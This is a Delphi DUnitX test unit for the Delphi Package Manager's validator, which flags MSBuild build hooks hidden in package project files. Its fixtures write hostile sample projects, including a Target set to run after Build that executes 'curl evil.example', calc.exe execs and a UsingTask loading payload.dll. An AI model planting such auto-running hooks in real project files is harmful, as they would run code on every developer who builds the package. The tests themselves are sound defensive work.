{***************************************************************************}
{                                                                           }
{           Delphi Package Manager - DPM                                    }
{                                                                           }
{           Copyright © 2026 Vincent Parrett and contributors               }
{                                                                           }
{           vincent@finalbuilder.com                                        }
{           https://www.finalbuilder.com                                    }
{                                                                           }
{                                                                           }
{***************************************************************************}
{                                                                           }
{  Licensed under the Apache License, Version 2.0 (the "License");          }
{  you may not use this file except in compliance with the License.         }
{  You may obtain a copy of the License at                                  }
{                                                                           }
{      http://www.apache.org/licenses/LICENSE-2.0                           }
{                                                                           }
{  Unless required by applicable law or agreed to in writing, software      }
{  distributed under the License is distributed on an "AS IS" BASIS,        }
{  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. }
{  See the License for the specific language governing permissions and      }
{  limitations under the License.                                           }
{                                                                           }
{***************************************************************************}

unit DPM.Core.Tests.Project.BuildHookValidator;

interface

uses
  DUnitX.TestFramework;

type
  {$M+}
  [TestFixture]
  TBuildHookValidatorTests = class
  private
    FSandboxDir : string;
    function WriteProject(const xml : string) : string;
    procedure WriteDeployProj(const projectFile : string; const xml : string);
    function ScanBlocking(const projectFile : string) : string;
  public
    [SetupFixture]
    procedure FixtureSetup;
    [TearDownFixture]
    procedure FixtureTearDown;

    [Test]
    [TestCase('DelphiTargets', '$(BDS)\Bin\CodeGear.Delphi.Targets')]
    [TestCase('CppTargets', '$(BDS)\Bin\CodeGear.Cpp.Targets')]
    [TestCase('LowerCase', '$(bds)\bin\codegear.delphi.targets')]
    [TestCase('UserTools', '$(APPDATA)\Embarcadero\$(BDSAPPDATABASEDIR)\$(PRODUCTVERSION)\UserTools.proj')]
    [TestCase('DeployProj', '$(MSBuildProjectName).deployproj')]
    [TestCase('DpmCopyLocal', '$(DPMCache)\DPM.CopyLocal.targets')]
    procedure KnownImport_IsAllowed(const importProject : string);

    [Test]
    [TestCase('RelativeTargets', 'evil.targets')]
    [TestCase('AbsolutePath', 'c:\temp\evil.targets')]
    [TestCase('UncPath', '\\server\share\evil.targets')]
    [TestCase('OtherBdsFile', '$(BDS)\Bin\evil.proj')]
    [TestCase('BdsSubFolder', '$(BDS)\Bin\sub\CodeGear.Delphi.Targets')]
    [TestCase('CopyLocalLookAlike', '$(DPMCache)\DPM.CopyLocal.targets.evil')]
    procedure UnknownImport_IsNotAllowed(const importProject : string);

    [Test]
    procedure DpmsOwnCopyLocalImportValue_IsAllowed;

    [Test]
    procedure ProjectEditedByDpm_ProducesNoBlockingFindings;

    [Test]
    procedure CleanProject_ProducesNoFindings;

    [Test]
    procedure TargetElement_IsBlockingAndNamesTheTarget;

    [Test]
    procedure TargetHungOffBuildWithAfterTargets_IsBlocking;

    [Test]
    procedure UsingTask_IsBlockingAndNamesTheTask;

    [Test]
    procedure UnknownImport_IsBlockingAndNamesTheImport;

    [Test]
    procedure DeployProjSibling_WithTarget_IsBlocking;

    [Test]
    procedure DeployProjSibling_Clean_IsNotBlocking;

    [Test]
    [TestCase('PreBuildEvent', 'PreBuildEvent')]
    [TestCase('PostBuildEvent', 'PostBuildEvent')]
    [TestCase('PreLinkEvent', 'PreLinkEvent')]
    [TestCase('CustomToolCommand', 'CustomToolCommand')]
    [TestCase('PreCompileTargets', '_PreCompileTargets')]
    [TestCase('PostCompileTargets', '_PostCompileTargets')]
    procedure BuildEventProperty_IsAdvisoryNotBlocking(const propertyName : string);

    [Test]
    procedure EmptyBuildEventProperty_IsNotReported;

    [Test]
    procedure MissingFile_ReturnsFalse;

    [Test]
    procedure MalformedXml_ReturnsFalse;

    [Test]
    procedure NonMsBuildRoot_ReturnsFalse;
  end;

implementation

uses
  Winapi.ActiveX,
  System.SysUtils,
  System.IOUtils,
  Spring.Collections,
  TestLogger,
  DPM.Core.Types,
  DPM.Core.Logging,
  DPM.Core.Configuration.Interfaces,
  DPM.Core.Configuration.Manager,
  DPM.Core.Project.Interfaces,
  DPM.Core.Project.Editor,
  DPM.Core.Project.CopyLocalTargets,
  DPM.Core.Project.BuildHookValidator;

const
  cProjectOpen =
    '<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">'#13#10 +
    '    <PropertyGroup>'#13#10 +
    '        <MainSource>Foo.dpk</MainSource>'#13#10 +
    //ProjectVersion is what TProjectEditor anchors its DPM PropertyGroup insert on - every real
    //dproj has one, and ProjectEditedByDpm_ProducesNoBlockingFindings needs it.
    '        <ProjectVersion>20.3</ProjectVersion>'#13#10 +
    '        <AppType>Package</AppType>'#13#10 +
    '    </PropertyGroup>'#13#10;

  cProjectClose = '</Project>'#13#10;

  //Every <Import> the Delphi IDE - and DPM itself - is known to write into a dproj. This is the
  //complete set observed across the 749 package dprojs in a populated package cache.
  cAllowedImports =
    '    <Import Project="$(BDS)\Bin\CodeGear.Delphi.Targets"/>'#13#10 +
    '    <Import Project="$(APPDATA)\Embarcadero\$(BDSAPPDATABASEDIR)\$(PRODUCTVERSION)\UserTools.proj"/>'#13#10 +
    '    <Import Project="$(MSBuildProjectName).deployproj"/>'#13#10 +
    '    <Import Project="$(DPMCache)\DPM.CopyLocal.targets"/>'#13#10;

  cCleanDeployProj =
    '<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">'#13#10 +
    '    <ItemGroup/>'#13#10 +
    '</Project>'#13#10;

procedure TBuildHookValidatorTests.FixtureSetup;
begin
  CoInitialize(nil);
  FSandboxDir := TPath.Combine(TPath.GetTempPath, 'dpmhook_' + TGuid.NewGuid.ToString);
  TDirectory.CreateDirectory(FSandboxDir);
end;

procedure TBuildHookValidatorTests.FixtureTearDown;
begin
  if TDirectory.Exists(FSandboxDir) then
    TDirectory.Delete(FSandboxDir, true);
  CoUninitialize;
end;

function TBuildHookValidatorTests.WriteProject(const xml : string) : string;
var
  name : string;
begin
  name := TGuid.NewGuid.ToString;
  name := StringReplace(name, '{', '', [rfReplaceAll]);
  name := StringReplace(name, '}', '', [rfReplaceAll]);
  name := StringReplace(name, '-', '', [rfReplaceAll]);
  result := TPath.Combine(FSandboxDir, 'p' + name + '.dproj');
  TFile.WriteAllText(result, xml, TEncoding.UTF8);
end;

procedure TBuildHookValidatorTests.WriteDeployProj(const projectFile : string; const xml : string);
begin
  TFile.WriteAllText(ChangeFileExt(projectFile, '.deployproj'), xml, TEncoding.UTF8);
end;

//Scans projectFile and returns the blocking findings joined into one string, so a test can assert
//the scan blocked and that the message named the offending thing.
function TBuildHookValidatorTests.ScanBlocking(const projectFile : string) : string;
var
  blocking : IList<string>;
  advisory : IList<string>;
begin
  blocking := TCollections.CreateList<string>;
  advisory := TCollections.CreateList<string>;
  Assert.IsTrue(TBuildHookValidator.TryScanFile(projectFile, blocking, advisory), 'project should be inspectable');
  result := string.Join(' | ', blocking.ToArray);
end;

procedure TBuildHookValidatorTests.KnownImport_IsAllowed(const importProject : string);
begin
  Assert.IsTrue(TBuildHookValidator.IsAllowedImport(importProject), importProject + ' should be allowed');
end;

procedure TBuildHookValidatorTests.UnknownImport_IsNotAllowed(const importProject : string);
begin
  Assert.IsFalse(TBuildHookValidator.IsAllowedImport(importProject), importProject + ' should not be allowed');
end;

procedure TBuildHookValidatorTests.DpmsOwnCopyLocalImportValue_IsAllowed;
begin
  //Distinct from the literal in KnownImport_IsAllowed on purpose : that pins the string this
  //validator recognises, this pins it to the constant TProjectEditor.EnsureCopyLocalImport writes.
  //If the two ever diverge, DPM would start rejecting its own import - fail here instead.
  Assert.IsTrue(TBuildHookValidator.IsAllowedImport(cCopyLocalImportProject),
                'DPM writes [' + cCopyLocalImportProject + '] into managed projects - it must be allowed');
end;

procedure TBuildHookValidatorTests.ProjectEditedByDpm_ProducesNoBlockingFindings;
var
  projectFile : string;
  logger : ILogger;
  configManager : IConfigurationManager;
  editor : IProjectEditor;
  blocking : IList<string>;
  advisory : IList<string>;
begin
  //The end to end version of the above : let DPM actually edit a project the way a restore does,
  //then scan the file it wrote. Package authors who use DPM sometimes ship a dproj still carrying
  //that import, so whatever the editor produces has to survive the scan unchanged.
  projectFile := WriteProject(cProjectOpen + cAllowedImports + cProjectClose);
  //A real config is required - EnsureCopyLocalImport writes the cache location into the DPM
  //PropertyGroup, so it reads IConfiguration.IsDefaultPackageCacheLocation.
  logger := TTestLogger.Create;
  configManager := TConfigurationManager.Create(logger);
  editor := TProjectEditor.Create(logger, configManager.NewConfig, TCompilerVersion.Delphi12_0);
  Assert.IsTrue(editor.LoadProject(projectFile, [TProjectElement.Platforms]), 'LoadProject should succeed');
  Assert.IsTrue(editor.EnsureCopyLocalImport('c:\tools\dpm.exe'), 'EnsureCopyLocalImport should succeed');
  Assert.IsTrue(editor.SaveProject(projectFile), 'SaveProject should succeed');

  blocking := TCollections.CreateList<string>;
  advisory := TCollections.CreateList<string>;
  Assert.IsTrue(TBuildHookValidator.TryScanFile(projectFile, blocking, advisory));
  Assert.AreEqual(0, blocking.Count, 'a DPM edited project must not be blocked : ' + string.Join(' | ', blocking.ToArray));
  Assert.AreEqual(0, advisory.Count, 'advisory : ' + string.Join(' | ', advisory.ToArray));
end;

procedure TBuildHookValidatorTests.CleanProject_ProducesNoFindings;
var
  projectFile : string;
  blocking : IList<string>;
  advisory : IList<string>;
begin
  blocking := TCollections.CreateList<string>;
  advisory := TCollections.CreateList<string>;
  projectFile := WriteProject(cProjectOpen + cAllowedImports + cProjectClose);
  Assert.IsTrue(TBuildHookValidator.TryScanFile(projectFile, blocking, advisory));
  Assert.AreEqual(0, blocking.Count, 'blocking : ' + string.Join(' | ', blocking.ToArray));
  Assert.AreEqual(0, advisory.Count, 'advisory : ' + string.Join(' | ', advisory.ToArray));
end;

procedure TBuildHookValidatorTests.TargetElement_IsBlockingAndNamesTheTarget;
var
  found : string;
begin
  found := ScanBlocking(WriteProject(cProjectOpen + cAllowedImports +
    '    <Target Name="Mischief">'#13#10 +
    '        <Exec Command="calc.exe"/>'#13#10 +
    '    </Target>'#13#10 + cProjectClose));
  Assert.Contains(found, 'Mischief', true, 'the finding should name the target : ' + found);
end;

procedure TBuildHookValidatorTests.TargetHungOffBuildWithAfterTargets_IsBlocking;
var
  found : string;
begin
  //AfterTargets is the hole the msbuild command line properties cannot close - it is exactly
  //what this scanner exists for.
  found := ScanBlocking(WriteProject(cProjectOpen + cAllowedImports +
    '    <Target Name="Sneaky" AfterTargets="Build">'#13#10 +
    '        <Exec Command="curl evil.example"/>'#13#10 +
    '    </Target>'#13#10 + cProjectClose));
  Assert.Contains(found, 'Sneaky', true, 'the finding should name the target : ' + found);
end;

procedure TBuildHookValidatorTests.UsingTask_IsBlockingAndNamesTheTask;
var
  found : string;
begin
  found := ScanBlocking(WriteProject(cProjectOpen + cAllowedImports +
    '    <UsingTask TaskName="Payload" AssemblyFile="payload.dll"/>'#13#10 + cProjectClose));
  Assert.Contains(found, 'Payload', true, 'the finding should name the task : ' + found);
end;

procedure TBuildHookValidatorTests.UnknownImport_IsBlockingAndNamesTheImport;
var
  found : string;
begin
  found := ScanBlocking(WriteProject(cProjectOpen + cAllowedImports +
    '    <Import Project="evil.targets"/>'#13#10 + cProjectClose));
  Assert.Contains(found, 'evil.targets', true, 'the finding should name the import : ' + found);
end;

procedure TBuildHookValidatorTests.DeployProjSibling_WithTarget_IsBlocking;
var
  projectFile : string;
  found : string;
begin
  //$(MSBuildProjectName).deployproj is allow listed because the IDE always writes the import, but
  //the file itself is relative - it can ship inside the package - so it has to be scanned too.
  projectFile := WriteProject(cProjectOpen + cAllowedImports + cProjectClose);
  WriteDeployProj(projectFile,
    '<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">'#13#10 +
    '    <Target Name="DeployMischief" AfterTargets="Build">'#13#10 +
    '        <Exec Command="calc.exe"/>'#13#10 +
    '    </Target>'#13#10 +
    '</Project>'#13#10);
  found := ScanBlocking(projectFile);
  Assert.Contains(found, 'DeployMischief', true, 'the deployproj should be scanned too : ' + found);
end;

procedure TBuildHookValidatorTests.DeployProjSibling_Clean_IsNotBlocking;
var
  projectFile : string;
  blocking : IList<string>;
  advisory : IList<string>;
begin
  blocking := TCollections.CreateList<string>;
  advisory := TCollections.CreateList<string>;
  projectFile := WriteProject(cProjectOpen + cAllowedImports + cProjectClose);
  WriteDeployProj(projectFile, cCleanDeployProj);
  Assert.IsTrue(TBuildHookValidator.TryScanFile(projectFile, blocking, advisory));
  Assert.AreEqual(0, blocking.Count, 'blocking : ' + string.Join(' | ', blocking.ToArray));
end;

procedure TBuildHookValidatorTests.BuildEventProperty_IsAdvisoryNotBlocking(const propertyName : string);
var
  projectFile : string;
  blocking : IList<string>;
  advisory : IList<string>;
begin
  blocking := TCollections.CreateList<string>;
  advisory := TCollections.CreateList<string>;
  projectFile := WriteProject(cProjectOpen + cAllowedImports +
    '    <PropertyGroup>'#13#10 +
    '        <' + propertyName + '>calc.exe</' + propertyName + '>'#13#10 +
    '    </PropertyGroup>'#13#10 + cProjectClose);
  Assert.IsTrue(TBuildHookValidator.TryScanFile(projectFile, blocking, advisory));
  //TMSBuildCompiler already passes each of these empty as a global property, so the hook cannot
  //fire - it is still wrong to ship, hence advisory rather than blocking.
  Assert.AreEqual(0, blocking.Count, 'should not block : ' + string.Join(' | ', blocking.ToArray));
  Assert.AreEqual(1, advisory.Count, 'expected one advisory finding');
  Assert.Contains(advisory[0], propertyName, true, 'the finding should name the property');
end;

procedure TBuildHookValidatorTests.EmptyBuildEventProperty_IsNotReported;
var
  projectFile : string;
  blocking : IList<string>;
  advisory : IList<string>;
begin
  //The IDE writes empty event elements into projects that have never had one set.
  blocking := TCollections.CreateList<string>;
  advisory := TCollections.CreateList<string>;
  projectFile := WriteProject(cProjectOpen + cAllowedImports +
    '    <PropertyGroup>'#13#10 +
    '        <PreBuildEvent/>'#13#10 +
    '        <PostBuildEvent>   </PostBuildEvent>'#13#10 +
    '    </PropertyGroup>'#13#10 + cProjectClose);
  Assert.IsTrue(TBuildHookValidator.TryScanFile(projectFile, blocking, advisory));
  Assert.AreEqual(0, advisory.Count, 'advisory : ' + string.Join(' | ', advisory.ToArray));
end;

procedure TBuildHookValidatorTests.MissingFile_ReturnsFalse;
var
  blocking : IList<string>;
  advisory : IList<string>;
begin
  blocking := TCollections.CreateList<string>;
  advisory := TCollections.CreateList<string>;
  Assert.IsFalse(TBuildHookValidator.TryScanFile(TPath.Combine(FSandboxDir, 'nope.dproj'), blocking, advisory));
end;

procedure TBuildHookValidatorTests.MalformedXml_ReturnsFalse;
var
  blocking : IList<string>;
  advisory : IList<string>;
begin
  blocking := TCollections.CreateList<string>;
  advisory := TCollections.CreateList<string>;
  Assert.IsFalse(TBuildHookValidator.TryScanFile(WriteProject('<Project><unclosed>'), blocking, advisory));
end;

procedure TBuildHookValidatorTests.NonMsBuildRoot_ReturnsFalse;
var
  blocking : IList<string>;
  advisory : IList<string>;
begin
  blocking := TCollections.CreateList<string>;
  advisory := TCollections.CreateList<string>;
  Assert.IsFalse(TBuildHookValidator.TryScanFile(WriteProject('<NotAProject/>'), blocking, advisory));
end;

initialization
  TDUnitX.RegisterTestFixture(TBuildHookValidatorTests);

end.
